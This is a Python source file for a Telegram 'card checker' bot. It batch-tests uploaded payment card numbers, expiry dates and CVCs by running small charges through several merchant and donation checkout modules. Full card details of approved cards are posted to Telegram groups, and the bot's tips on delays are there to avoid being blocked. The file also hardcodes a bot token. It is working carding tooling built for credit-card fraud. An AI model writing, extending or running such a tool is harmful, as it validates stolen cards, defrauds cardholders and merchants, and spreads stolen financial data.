#!/usr/bin/env python3
"""
MADY - Telegram Card Checker Bot
Handles text files, slash commands, and batch processing
"""

import telebot
import time
import os
import sys
import threading
from datetime import datetime
import traceback

# Add charge modules path
sys.path.insert(0, '100$/100$/')

# Bot Configuration
BOT_TOKEN = "7984658748:AAF1QfpAPVg9ncXkA4NKRohqxNfBZ8Pet1s"
GROUP_IDS = ["-1003538559040", "-4997223070", "-1003643720778"]
BOT_CREDIT = "@MissNullMe"

# Initialize bot
bot = telebot.TeleBot(BOT_TOKEN)

# Import gateways
gateways = {}
try:
    from Charge1 import BlemartCheckout
    gateways[1] = {"func": BlemartCheckout, "name": "Blemart", "amount": "$4.99"}
except: pass

try:
    from Charge2 import DistrictPeopleCheckout
    gateways[2] = {"func": DistrictPeopleCheckout, "name": "District People", "amount": "€69.00"}
except: pass

try:
    from Charge3 import SaintVinsonDonateCheckout
    gateways[3] = {"func": SaintVinsonDonateCheckout, "name": "Saint Vinson", "amount": "$20.00"}
except: pass

try:
    from Charge4 import BGDCheckoutLogic
    gateways[4] = {"func": BGDCheckoutLogic, "name": "BGD Fresh", "amount": "$6.50"}
except: pass

try:
    from Charge5 import StaleksFloridaCheckoutVNew
    gateways[5] = {"func": StaleksFloridaCheckoutVNew, "name": "CC Foundation", "amount": "$1.00"}
except: pass

# User states
user_states = {}
active_checks = {}

def format_card_display(card):
    """Format card for display"""
    parts = card.split('|')
    if len(parts) == 4:
        return f"{parts[0][:4]}****{parts[0][-4:]}|{parts[1]}|{parts[2]}|***"
    return card[:8] + "****"

def send_to_groups(message):
    """Send message to all configured groups"""
    for group_id in GROUP_IDS:
        try:
            bot.send_message(group_id, message, parse_mode='HTML')
            time.sleep(0.5)
        except Exception as e:
            print(f"Error sending to group {group_id}: {e}")

def check_single_card(card, gateway_num, user_id):
    """Check a single card"""
    try:
        if gateway_num not in gateways:
            return f"❌ Gateway {gateway_num} not available"
        
        gateway = gateways[gateway_num]
        result = gateway["func"](card)
        
        # Format result
        card_display = format_card_display(card)
        
        if "Charged" in str(result) or "Approved" in str(result) or "success" in str(result).lower():
            # Send to groups
            msg = f"""<b>✅ APPROVED</b>
━━━━━━━━━━━━━━━━
<b>Card:</b> <code>{card}</code>
<b>Gateway:</b> {gateway['name']} ({gateway['amount']})
<b>Response:</b> {result[:100]}
━━━━━━━━━━━━━━━━
<b>Bot by:</b> {BOT_CREDIT}"""
            send_to_groups(msg)
            return f"✅ {card_display} - APPROVED"
        
        elif "insufficient" in str(result).lower():
            return f"💰 {card_display} - Insufficient Funds"
        elif "expired" in str(result).lower():
            return f"📅 {card_display} - Expired"
        elif "incorrect" in str(result).lower() or "invalid" in str(result).lower():
            return f"❌ {card_display} - Invalid Card"
        else:
            return f"❌ {card_display} - Declined"
            
    except Exception as e:
        return f"⚠️ Error: {str(e)[:50]}"

def process_batch(cards, gateway_num, user_id, message_id):
    """Process batch of cards"""
    try:
        total = len(cards)
        approved = 0
        declined = 0
        errors = 0
        
        # Send initial status
        status_msg = bot.send_message(
            user_id,
            f"🔄 Processing {total} cards with Gateway {gateway_num}...\n"
            f"⏱️ Estimated time: {total * 3} seconds"
        )
        
        results = []
        
        for i, card in enumerate(cards):
            # Check if stop requested
            if user_id in active_checks and not active_checks[user_id]:
                bot.edit_message_text(
                    "🛑 Check stopped by user",
                    user_id, status_msg.message_id
                )
                break
            
            # Check card
            result = check_single_card(card.strip(), gateway_num, user_id)
            results.append(result)
            
            # Count results
            if "✅" in result or "APPROVED" in result:
                approved += 1
            elif "⚠️" in result:
                errors += 1
            else:
                declined += 1
            
            # Update status every 10 cards
            if (i + 1) % 10 == 0 or (i + 1) == total:
                progress = f"""🔄 Progress: {i+1}/{total}
✅ Approved: {approved}
❌ Declined: {declined}
⚠️ Errors: {errors}"""
                
                try:
                    bot.edit_message_text(progress, user_id, status_msg.message_id)
                except:
                    pass
            
            # Delay between checks
            time.sleep(2)
        
        # Final summary
        summary = f"""✅ <b>Check Complete!</b>
━━━━━━━━━━━━━━━━
<b>Total Cards:</b> {total}
<b>Approved:</b> {approved} ({approved*100//total if total else 0}%)
<b>Declined:</b> {declined}
<b>Errors:</b> {errors}
<b>Gateway:</b> {gateways[gateway_num]['name']}
━━━━━━━━━━━━━━━━
<b>Bot by:</b> {BOT_CREDIT}"""
        
        bot.send_message(user_id, summary, parse_mode='HTML')
        
        # Send detailed results if less than 50 cards
        if total <= 50:
            result_text = "\n".join(results)
            chunks = [result_text[i:i+4000] for i in range(0, len(result_text), 4000)]
            for chunk in chunks:
                bot.send_message(user_id, f"<pre>{chunk}</pre>", parse_mode='HTML')
                time.sleep(0.5)
        
    except Exception as e:
        bot.send_message(user_id, f"❌ Error in batch processing: {str(e)}")
        traceback.print_exc()
    finally:
        if user_id in active_checks:
            del active_checks[user_id]

# Command Handlers

@bot.message_handler(commands=['start'])
def start_command(message):
    welcome = f"""<b>Welcome to MADY Card Checker Bot!</b> 🚀

<b>Commands:</b>
/check - Check cards from file
/gateway - Select gateway
/stop - Stop current check
/status - View available gateways
/help - Show help

<b>How to use:</b>
1. Send /check command
2. Upload your text file (format: NUMBER|MM|YY|CVC)
3. Select gateway when prompted
4. Wait for results

<b>Features:</b>
✅ Batch processing (200+ cards)
✅ Multiple gateways
✅ Auto-post to groups
✅ Real-time progress

<b>Bot by:</b> {BOT_CREDIT}"""
    
    bot.send_message(message.chat.id, welcome, parse_mode='HTML')

@bot.message_handler(commands=['check'])
def check_command(message):
    user_id = message.chat.id
    user_states[user_id] = "waiting_file"
    bot.send_message(
        user_id,
        "📁 Please upload your text file with cards\n"
        "Format: NUMBER|MM|YY|CVC (one per line)"
    )

@bot.message_handler(commands=['gateway'])
def gateway_command(message):
    user_id = message.chat.id
    
    if not gateways:
        bot.send_message(user_id, "❌ No gateways available")
        return
    
    gateway_list = "<b>Available Gateways:</b>\n\n"
    for num, gw in gateways.items():
        gateway_list += f"{num}. {gw['name']} ({gw['amount']})\n"
    
    gateway_list += "\nReply with gateway number (1-5)"
    
    bot.send_message(user_id, gateway_list, parse_mode='HTML')
    user_states[user_id] = "selecting_gateway_only"

@bot.message_handler(commands=['stop'])
def stop_command(message):
    user_id = message.chat.id
    if user_id in active_checks:
        active_checks[user_id] = False
        bot.send_message(user_id, "🛑 Stopping current check...")
    else:
        bot.send_message(user_id, "No active check to stop")

@bot.message_handler(commands=['status'])
def status_command(message):
    user_id = message.chat.id
    
    status = f"""<b>MADY Bot Status</b> 🟢

<b>Available Gateways:</b> {len(gateways)}
<b>Groups Connected:</b> {len(GROUP_IDS)}
<b>Bot Credit:</b> {BOT_CREDIT}

<b>Gateways:</b>"""
    
    for num, gw in gateways.items():
        status += f"\n{num}. {gw['name']} - {gw['amount']}"
    
    if user_id in active_checks:
        status += "\n\n⚠️ You have an active check running"
    
    bot.send_message(user_id, status, parse_mode='HTML')

@bot.message_handler(commands=['help'])
def help_command(message):
    help_text = """<b>MADY Bot Help</b> 📚

<b>Card Format:</b>
NUMBER|MM|YY|CVC
Example: 4242424242424242|12|25|123

<b>Commands:</b>
/check - Start checking cards
/gateway - Select different gateway
/stop - Stop current check
/status - View bot status
/help - Show this help

<b>Tips:</b>
• Max 200 cards per batch recommended
• Use 2-3 second delays to avoid blocks
• Gateway 5 is fastest ($1.00)
• Check stops automatically on errors

<b>Support:</b> {BOT_CREDIT}"""
    
    bot.send_message(message.chat.id, help_text, parse_mode='HTML')

# File Handler
@bot.message_handler(content_types=['document'])
def handle_file(message):
    user_id = message.chat.id
    
    if user_states.get(user_id) != "waiting_file":
        bot.send_message(user_id, "Send /check first to start checking")
        return
    
    try:
        # Download file
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        
        # Parse cards
        cards = downloaded_file.decode('utf-8').strip().split('\n')
        valid_cards = []
        
        for card in cards:
            card = card.strip()
            if '|' in card and len(card.split('|')) == 4:
                valid_cards.append(card)
        
        if not valid_cards:
            bot.send_message(user_id, "❌ No valid cards found in file")
            user_states[user_id] = None
            return
        
        # Store cards
        user_states[user_id] = {
            "cards": valid_cards,
            "state": "selecting_gateway"
        }
        
        # Ask for gateway
        gateway_list = f"<b>Found {len(valid_cards)} valid cards</b>\n\n"
        gateway_list += "<b>Select Gateway:</b>\n"
        for num, gw in gateways.items():
            gateway_list += f"{num}. {gw['name']} ({gw['amount']})\n"
        
        gateway_list += "\nReply with gateway number (1-5)"
        
        bot.send_message(user_id, gateway_list, parse_mode='HTML')
        
    except Exception as e:
        bot.send_message(user_id, f"❌ Error processing file: {str(e)}")
        user_states[user_id] = None

# Text Handler
@bot.message_handler(func=lambda message: True)
def handle_text(message):
    user_id = message.chat.id
    text = message.text.strip()
    
    # Check if selecting gateway
    if user_id in user_states:
        state = user_states[user_id]
        
        if isinstance(state, dict) and state.get("state") == "selecting_gateway":
            try:
                gateway_num = int(text)
                if gateway_num in gateways:
                    cards = state["cards"]
                    user_states[user_id] = None
                    active_checks[user_id] = True
                    
                    # Start batch processing in thread
                    thread = threading.Thread(
                        target=process_batch,
                        args=(cards, gateway_num, user_id, message.message_id)
                    )
                    thread.start()
                else:
                    bot.send_message(user_id, f"❌ Invalid gateway. Choose from: {list(gateways.keys())}")
            except ValueError:
                bot.send_message(user_id, "❌ Please enter a valid number")
        
        elif state == "selecting_gateway_only":
            # Just showing gateway info
            try:
                gateway_num = int(text)
                if gateway_num in gateways:
                    gw = gateways[gateway_num]
                    info = f"""<b>Gateway {gateway_num} Info:</b>
                    
Name: {gw['name']}
Amount: {gw['amount']}
Status: 🟢 Active

Send /check to start checking cards"""
                    bot.send_message(user_id, info, parse_mode='HTML')
                else:
                    bot.send_message(user_id, f"❌ Invalid gateway number")
            except ValueError:
                bot.send_message(user_id, "❌ Please enter a valid number")
            user_states[user_id] = None
    
    # Check for single card format
    elif '|' in text and len(text.split('|')) == 4:
        # Single card check
        bot.send_message(user_id, "🔄 Checking card...")
        result = check_single_card(text, 5, user_id)  # Default to gateway 5
        bot.send_message(user_id, result)

# Main
if __name__ == "__main__":
    print("="*50)
    print("MADY Card Checker Bot Starting...")
    print(f"Bot Token: {BOT_TOKEN[:20]}...")
    print(f"Groups: {len(GROUP_IDS)}")
    print(f"Gateways: {len(gateways)}")
    print("="*50)
    
    try:
        bot.infinity_polling()
    except Exception as e:
        print(f"Bot error: {e}")
        traceback.print_exc()
